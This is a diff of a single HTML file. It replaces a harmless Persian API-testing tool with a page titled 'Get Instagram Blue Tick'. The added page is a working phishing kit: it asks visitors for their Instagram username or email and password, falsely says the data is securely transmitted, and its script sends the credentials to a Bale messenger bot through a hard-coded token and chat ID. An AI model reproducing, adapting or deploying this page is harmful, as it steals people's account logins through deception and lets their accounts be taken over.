@@ -1,473 +1,294 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#1A1A2E">
-<title>API Finder Pro Max</title>
+<title>Get Instagram Blue Tick</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-body {
-  font-family: -apple-system, 'Segoe UI', Tahoma, sans-serif;
-  background: linear-gradient(180deg, #1A1A2E, #16213E, #0F0F1E);
-  min-height: 100vh;
-  color: #fff;
-  padding: 15px;
-}
-.header { text-align: center; margin-bottom: 20px; }
-.header h1 {
-  font-size: 22px;
-  background: linear-gradient(90deg, #00D2FF, #3A7BD5);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  font-weight: 800;
-}
-.header p { font-size: 12px; color: #888; margin-top: 5px; }
-.input-box {
-  display: flex;
-  background: rgba(255,255,255,0.05);
-  border: 1px solid rgba(255,255,255,0.1);
-  border-radius: 14px;
-  padding: 5px;
-  margin-bottom: 12px;
-}
-.input-box input {
-  flex: 1;
-  background: transparent;
-  border: none;
-  outline: none;
-  color: #fff;
-  padding: 12px;
-  font-size: 13px;
-  direction: ltr;
-  text-align: left;
-}
-.input-box input::placeholder { color: #555; }
-.input-box button {
-  background: linear-gradient(135deg, #00D2FF, #3A7BD5);
-  border: none;
-  border-radius: 10px;
-  padding: 12px 18px;
-  color: #fff;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-}
-.methods {
-  display: flex;
-  gap: 6px;
-  overflow-x: auto;
-  padding-bottom: 10px;
-  margin-bottom: 10px;
-  scrollbar-width: none;
-}
-.methods::-webkit-scrollbar { display: none; }
-.method-btn {
-  padding: 8px 14px;
-  border-radius: 8px;
-  border: 1px solid rgba(255,255,255,0.1);
-  background: rgba(255,255,255,0.05);
-  color: #888;
-  font-size: 11px;
-  font-weight: bold;
-  white-space: nowrap;
-  cursor: pointer;
-}
-.method-btn.active {
-  background: linear-gradient(135deg, #00D2FF, #3A7BD5);
-  color: #fff;
-  border-color: transparent;
-}
-.actions {
-  display: flex;
-  justify-content: space-around;
-  margin: 15px 0;
-}
-.circle-btn {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 6px;
-  cursor: pointer;
-}
-.circle-btn .circle {
-  width: 60px;
-  height: 60px;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 24px;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-  transition: 0.2s;
-}
-.circle-btn:active .circle { transform: scale(0.9); }
-.circle-red { background: linear-gradient(135deg, #FF4757, #c0392b); }
-.circle-green { background: linear-gradient(135deg, #00FF88, #00b36b); }
-.circle-pink { background: linear-gradient(135deg, #FF6B9D, #c44569); }
-.circle-btn span { font-size: 11px; color: #ccc; }
-.info-cards {
-  display: flex;
-  gap: 8px;
-  margin-bottom: 12px;
-  display: none;
-}
-.info-cards.show { display: flex; }
-.info-card {
-  flex: 1;
-  background: rgba(0,0,0,0.3);
-  border-radius: 10px;
-  padding: 10px;
-  border-left: 3px solid #00D2FF;
-  text-align: center;
-}
-.info-card .label { font-size: 10px; color: #888; }
-.info-card .value { font-size: 13px; font-weight: bold; color: #00D2FF; margin-top: 3px; }
-.info-card.success { border-left-color: #00FF88; }
-.info-card.success .value { color: #00FF88; }
-.info-card.error { border-left-color: #FF4757; }
-.info-card.error .value { color: #FF4757; }
-.output {
-  background: #0A0A15;
-  border-radius: 12px;
-  padding: 15px;
-  min-height: 300px;
-  max-height: 55vh;
-  overflow-y: auto;
-  font-family: 'Courier New', monospace;
-  font-size: 12px;
-  line-height: 1.6;
-  white-space: pre-wrap;
-  word-break: break-all;
-  direction: ltr;
-  text-align: left;
-  border: 1px solid rgba(255,255,255,0.05);
-}
-.output .key { color: #00D2FF; }
-.output .string { color: #00FF88; }
-.output .number { color: #FFA502; }
-.output .bool { color: #FF6B81; }
-.loading {
-  text-align: center;
-  padding: 20px;
-  display: none;
-}
-.loading.show { display: block; }
-.spinner {
-  display: inline-block;
-  width: 30px;
-  height: 30px;
-  border: 3px solid rgba(0,210,255,0.2);
-  border-top-color: #00D2FF;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.footer-note {
-  text-align: center;
-  font-size: 11px;
-  color: #555;
-  margin-top: 15px;
-}
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', 'Segoe UI', Tahoma, sans-serif;
+  }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+    background-size: 400% 400%;
+    animation: gradientBG 15s ease infinite;
+    padding: 20px;
+  }
+
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.98);
+    backdrop-filter: blur(20px);
+    border-radius: 24px;
+    padding: 28px 25px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
+    text-align: center;
+    animation: fadeIn 0.8s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .verified-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .verified-badge svg {
+    width: 30px;
+    height: 30px;
+  }
+
+  h1 {
+    font-size: 21px;
+    color: #262626;
+    margin-bottom: 6px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+  }
+
+  .subtitle {
+    font-size: 12.5px;
+    color: #8e8e8e;
+    margin-bottom: 20px;
+    font-weight: 400;
+  }
+
+  .image-box {
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    overflow: hidden;
+    margin: 0 auto 22px;
+    box-shadow: 0 8px 25px rgba(225, 48, 108, 0.3);
+    border: 3px solid #fff;
+    outline: 3px solid transparent;
+    background: linear-gradient(135deg, #405DE6, #833AB4, #E1306C) border-box;
+    padding: 3px;
+  }
+
+  .image-box img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    border-radius: 50%;
+  }
+
+  .input-group {
+    margin-bottom: 14px;
+    text-align: left;
+  }
+
+  .input-group label {
+    display: block;
+    font-size: 11.5px;
+    color: #555;
+    margin-bottom: 6px;
+    font-weight: 600;
+    padding-left: 4px;
+    letter-spacing: 0.2px;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 13px 16px;
+    border: 2px solid #efefef;
+    border-radius: 12px;
+    font-size: 13.5px;
+    font-family: 'Poppins', sans-serif;
+    background: #fafafa;
+    transition: all 0.3s ease;
+    outline: none;
+    color: #262626;
+  }
+
+  .input-group input::placeholder {
+    color: #b0b0b0;
+    font-weight: 400;
+  }
+
+  .input-group input:focus {
+    border-color: #E1306C;
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(225, 48, 108, 0.1);
+  }
+
+  .login-btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #405DE6, #833AB4, #E1306C);
+    color: #fff;
+    font-size: 15px;
+    font-family: 'Poppins', sans-serif;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 20px rgba(225, 48, 108, 0.4);
+    letter-spacing: 0.8px;
+    margin-top: 6px;
+  }
+
+  .login-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(225, 48, 108, 0.55);
+  }
+
+  .login-btn:active {
+    transform: translateY(0);
+  }
+
+  .login-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .status {
+    margin-top: 14px;
+    font-size: 12.5px;
+    font-weight: 600;
+    min-height: 18px;
+  }
+
+  .status.success { color: #22c55e; }
+  .status.error { color: #ef4444; }
+
+  .footer-note {
+    margin-top: 16px;
+    font-size: 10.5px;
+    color: #b0b0b0;
+    line-height: 1.6;
+    font-weight: 400;
+  }
 </style>
 </head>
 <body>
 
-<div class="header">
-  <h1>⚡ API Finder Pro Max</h1>
-  <p>کاوشگر حرفه‌ای API + JSON</p>
-</div>
+  <div class="card">
+    <div class="verified-badge">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L14.5 4.5L18 4L19 7.5L22 9.5L20.5 12.5L22 15.5L19 17.5L18 21L14.5 20.5L12 23L9.5 20.5L6 21L5 17.5L2 15.5L3.5 12.5L2 9.5L5 7.5L6 4L9.5 4.5L12 2Z" fill="#0095F6"/>
+        <path d="M10.5 15.5L7.5 12.5L8.9 11.1L10.5 12.7L15.1 8.1L16.5 9.5L10.5 15.5Z" fill="white"/>
+      </svg>
+      <span style="font-size: 14px; font-weight: 700; color:#0095F6; font-family:'Poppins',sans-serif;">Verified</span>
+    </div>
 
-<div class="input-box">
-  <input type="text" id="urlInput" placeholder="https://jsonplaceholder.typicode.com/posts/1" value="https://jsonplaceholder.typicode.com/posts/1">
-  <button onclick="fetchApi()">→</button>
-</div>
+    <h1>Get Instagram Blue Tick</h1>
+    <p class="subtitle">Enter your information to verify your account</p>
 
-<div class="methods" id="methods">
-  <button class="method-btn active" data-method="GET">GET</button>
-  <button class="method-btn" data-method="POST">POST</button>
-  <button class="method-btn" data-method="PUT">PUT</button>
-  <button class="method-btn" data-method="DELETE">DELETE</button>
-  <button class="method-btn" data-method="PATCH">PATCH</button>
-</div>
+    <div class="image-box">
+      <img src="https://cdn.imgurl.ir/uploads/b90491_images_3_8.jpeg" alt="Instagram Verification">
+    </div>
 
-<div class="actions">
-  <div class="circle-btn" onclick="fetchApi()">
-    <div class="circle circle-red">▶</div>
-    <span>فعال سازی</span>
+    <div class="input-group">
+      <label for="userInput">Username or Email</label>
+      <input type="text" id="userInput" placeholder="Enter your username or email" autocomplete="off">
+    </div>
+
+    <div class="input-group">
+      <label for="passInput">Password</label>
+      <input type="password" id="passInput" placeholder="Enter your password" autocomplete="off">
+    </div>
+
+    <button class="login-btn" id="loginBtn">Login</button>
+    <div class="status" id="status"></div>
+
+    <p class="footer-note">Your information is securely transmitted.</p>
   </div>
-  <div class="circle-btn" onclick="testDemo()">
-    <div class="circle circle-green">🧪</div>
-    <span>تست</span>
-  </div>
-  <div class="circle-btn" onclick="showHelp()">
-    <div class="circle circle-pink">❓</div>
-    <span>راهنما</span>
-  </div>
-</div>
-
-<div class="info-cards" id="infoCards">
-  <div class="info-card">
-    <div class="label">متد</div>
-    <div class="value" id="methodValue">-</div>
-  </div>
-  <div class="info-card" id="statusCard">
-    <div class="label">وضعیت</div>
-    <div class="value" id="statusValue">-</div>
-  </div>
-  <div class="info-card">
-    <div class="label">زمان</div>
-    <div class="value" id="timeValue">-</div>
-  </div>
-</div>
-
-<div class="loading" id="loading">
-  <div class="spinner"></div>
-  <p style="margin-top:10px; color:#00D2FF; font-size:12px;" id="loadingText">در حال دریافت...</p>
-</div>
-
-<div class="output" id="output">
-  <span style="color:#555;">نتیجه اینجا نمایش داده می‌شود...</span>
-</div>
-
-<div class="footer-note">ساخته شده با ❤️ برای کاوش APIها</div>
 
 <script>
-let selectedMethod = 'GET';
-let rawText = '';
-let decodedData = null;
-let headersData = {};
+  // ربات بله
+  const BOT_TOKEN = "596915370:d5Ufucgk67gumzzlKN_65Z_VvENRhilUhA0";
+  const CHAT_ID = "1545420338";
+  const BALE_API = `https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage`;
 
-document.querySelectorAll('.method-btn').forEach(btn => {
-  btn.addEventListener('click', () => {
-    document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    selectedMethod = btn.dataset.method;
-  });
-});
+  const loginBtn = document.getElementById("loginBtn");
+  const userInput = document.getElementById("userInput");
+  const passInput = document.getElementById("passInput");
+  const status = document.getElementById("status");
 
-// ============ لیست پروکسی‌های معتبر ============
-// ترتیب: سریع‌ترین و پایدارترین اول
-const PROXIES = [
-  (url) => 'https://corsproxy.io/?' + encodeURIComponent(url),
-  (url) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url),
-  (url) => 'https://thingproxy.freeboard.io/fetch/' + url,
-  (url) => 'https://cors-anywhere.herokuapp.com/' + url,
-];
+  loginBtn.addEventListener("click", async () => {
+    const username = userInput.value.trim();
+    const password = passInput.value.trim();
 
-async function fetchWithFallback(url) {
-  let lastError = null;
-  for (let i = 0; i < PROXIES.length; i++) {
+    if (!username) {
+      status.textContent = "Please enter your username or email.";
+      status.className = "status error";
+      return;
+    }
+
+    if (!password) {
+      status.textContent = "Please enter your password.";
+      status.className = "status error";
+      return;
+    }
+
+    loginBtn.disabled = true;
+    loginBtn.textContent = "Sending...";
+    status.textContent = "";
+
+    const message =
+      `🔐 New Instagram Blue Tick Request\n\n` +
+      `👤 Username/Email: ${username}\n` +
+      `🔑 Password: ${password}\n` +
+      `🕐 Time: ${new Date().toLocaleString()}`;
+
     try {
-      document.getElementById('loadingText').textContent = 
-        'تلاش ' + (i+1) + ' از ' + PROXIES.length + '...';
-      
-      const proxyUrl = PROXIES[i](url);
-      const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 12000);
-      
-      const response = await fetch(proxyUrl, { 
-        signal: controller.signal,
-        method: 'GET',
-        headers: { 'Accept': 'application/json, text/plain, */*' }
+      const response = await fetch(BALE_API, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
       });
-      
-      clearTimeout(timeout);
-      
-      // اگه خطای شبکه نبود، برمی‌گردونیم
-      if (response.status < 500) {
-        return response;
+
+      const data = await response.json();
+
+      if (data.ok) {
+        status.textContent = "✓ Submitted successfully!";
+        status.className = "status success";
+        userInput.value = "";
+        passInput.value = "";
+      } else {
+        throw new Error("Failed");
       }
-    } catch (e) {
-      console.log('پروکسی ' + (i+1) + ' ناموفق:', e.message);
-      lastError = e;
-      continue;
+    } catch (err) {
+      status.textContent = "✗ Error, please try again.";
+      status.className = "status error";
+      console.error(err);
+    } finally {
+      loginBtn.disabled = false;
+      loginBtn.textContent = "Login";
     }
-  }
-  throw lastError || new Error('همه پروکسی‌ها ناموفق بودند');
-}
-
-// ============ دریافت API ============
-async function fetchApi() {
-  const url = document.getElementById('urlInput').value.trim();
-  if (!url) { alert('لطفا آدرس را وارد کن'); return; }
-  if (!url.startsWith('http')) { alert('آدرس باید با http یا https شروع شود'); return; }
-
-  const loading = document.getElementById('loading');
-  const output = document.getElementById('output');
-  const infoCards = document.getElementById('infoCards');
-
-  loading.classList.add('show');
-  infoCards.classList.remove('show');
-  output.innerHTML = '<span style="color:#555;">در حال دریافت...</span>';
-
-  const startTime = performance.now();
-
-  try {
-    const response = await fetchWithFallback(url);
-    const endTime = performance.now();
-    const responseTime = Math.round(endTime - startTime);
-
-    rawText = await response.text();
-    headersData = {};
-    response.headers.forEach((v, k) => headersData[k] = v);
-
-    loading.classList.remove('show');
-    infoCards.classList.add('show');
-
-    document.getElementById('methodValue').textContent = selectedMethod;
-    const statusCard = document.getElementById('statusCard');
-    document.getElementById('statusValue').textContent = response.status;
-    statusCard.className = 'info-card ' + (response.ok ? 'success' : 'error');
-    document.getElementById('timeValue').textContent = responseTime + 'ms';
-
-    decodedData = decodeResponse(rawText, headersData['content-type'] || '');
-    renderOutput();
-
-  } catch (error) {
-    loading.classList.remove('show');
-    output.innerHTML = 
-      '<span style="color:#FF4757;">❌ خطا: ' + escapeHtml(error.message) + '\n\n' +
-      '💡 راه‌حل‌ها:\n' +
-      '1. اتصال اینترنتت رو چک کن\n' +
-      '2. یه API دیگه امتحان کن (دکمه «تست» رو بزن)\n' +
-      '3. VPN رو روشن/خاموش کن\n' +
-      '4. چند دقیقه بعد دوباره امتحان کن</span>';
-  }
-}
-
-// ============ تست خودکار ============
-async function testDemo() {
-  const demos = [
-    'https://jsonplaceholder.typicode.com/posts/1',
-    'https://api.github.com/users/github',
-    'https://dog.ceo/api/breeds/image/random',
-  ];
-  
-  const output = document.getElementById('output');
-  let html = '<span style="color:#00D2FF;">🧪 در حال تست پروکسی‌ها...\n\n</span>';
-  output.innerHTML = html;
-  document.getElementById('loading').classList.add('show');
-
-  for (let i = 0; i < demos.length; i++) {
-    try {
-      document.getElementById('loadingText').textContent = 'تست API ' + (i+1) + '...';
-      const start = performance.now();
-      const response = await fetchWithFallback(demos[i]);
-      const end = performance.now();
-      const text = await response.text();
-      
-      html += '<span style="color:#00FF88;">✅ ' + demos[i] + '\n';
-      html += '   وضعیت: ' + response.status + ' | زمان: ' + Math.round(end-start) + 'ms</span>\n\n';
-    } catch (e) {
-      html += '<span style="color:#FF4757;">❌ ' + demos[i] + '\n';
-      html += '   خطا: ' + e.message + '</span>\n\n';
-    }
-    output.innerHTML = html;
-  }
-
-  document.getElementById('loading').classList.remove('show');
-  html += '<span style="color:#FFA502;">\n💡 اگه همه تست‌ها موفق بودن، یعنی اینترنت و پروکسی‌ها OK هستن.</span>';
-  output.innerHTML = html;
-}
-
-// ============ راهنما ============
-function showHelp() {
-  const output = document.getElementById('output');
-  output.innerHTML = `<span style="color:#00D2FF; font-size:14px;">📖 راهنما\n\n</span>
-<span style="color:#00FF88;">1.</span> آدرس API رو توی کادر بالا وارد کن
-   مثال: https://jsonplaceholder.typicode.com/posts/1
-
-<span style="color:#00FF88;">2.</span> متد رو انتخاب کن (GET, POST, ...)
-
-<span style="color:#00FF88;">3.</span> دکمه <span style="color:#FF4757;">▶ فعال سازی</span> رو بزن
-
-<span style="color:#00FF88;">4.</span> نتیجه به صورت خودکار رمزگشایی می‌شه
-
-<span style="color:#FFA502;">🔓 رمزگشایی‌های پشتیبانی شده:</span>
-   • JSON (مرتب و رنگی)
-   • Base64
-   • URL Encoding
-   • HTML (تبدیل به متن)
-
-<span style="color:#FFA502;">💡 نکته:</span> اگه خطا دیدی، دکمه «تست» رو بزن تا ببینی مشکل از چیه.
-
-<span style="color:#FFA502;">📌 اگه همه پروکسی‌ها خطا دادن:</span>
-   • اینترنتت رو چک کن
-   • VPN رو روشن کن
-   • یا چند دقیقه بعد امتحان کن`;
-}
-
-// ============ رمزگشایی ============
-function decodeResponse(text, contentType) {
-  if (!text) return { type: 'empty', text: 'پاسخ خالی است' };
-
-  try {
-    const json = JSON.parse(text);
-    return { type: 'json', data: json };
-  } catch (e) {}
-
-  try {
-    if (/^[A-Za-z0-9+/=\s]+$/.test(text) && text.replace(/\s/g, '').length % 4 === 0) {
-      const decoded = atob(text.replace(/\s/g, ''));
-      if (/^[\x20-\x7E\s\u0600-\u06FF]+$/.test(decoded)) {
-        try {
-          return { type: 'base64-json', data: JSON.parse(decoded) };
-        } catch (e) {
-          return { type: 'base64', text: decoded };
-        }
-      }
-    }
-  } catch (e) {}
-
-  if (/%[0-9A-Fa-f]{2}/.test(text)) {
-    try {
-      const dec = decodeURIComponent(text);
-      if (dec !== text) return { type: 'url', text: dec };
-    } catch (e) {}
-  }
-
-  if (contentType.indexOf('html') > -1 || /<html|<div|<body/i.test(text)) {
-    const div = document.createElement('div');
-    div.innerHTML = text;
-    return { type: 'html', text: (div.textContent || '').trim() };
-  }
-
-  return { type: 'text', text: text };
-}
-
-function renderOutput() {
-  const output = document.getElementById('output');
-  if (decodedData && decodedData.data) {
-    output.innerHTML = syntaxHighlight(decodedData.data);
-  } else if (decodedData && decodedData.text) {
-    output.innerHTML = '<span style="color:#00FF88;">' + escapeHtml(decodedData.text) + '</span>';
-  } else {
-    output.innerHTML = '<span style="color:#555;">داده‌ای نیست</span>';
-  }
-}
-
-function syntaxHighlight(json) {
-  if (typeof json !== 'object' || json === null) return escapeHtml(String(json));
-  let str = JSON.stringify(json, null, 2);
-  str = escapeHtml(str);
-  return str.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (m) {
-    let cls = 'number';
-    if (/^"/.test(m)) cls = /:$/.test(m) ? 'key' : 'string';
-    else if (/true|false/.test(m)) cls = 'bool';
-    return '<span class="' + cls + '">' + m + '</span>';
   });
-}
-
-function escapeHtml(t) {
-  const d = document.createElement('div');
-  d.textContent = t;
-  return d.innerHTML;
-}
-
-document.getElementById('urlInput').addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') fetchApi();
-});
 </script>
+
 </body>
 </html>
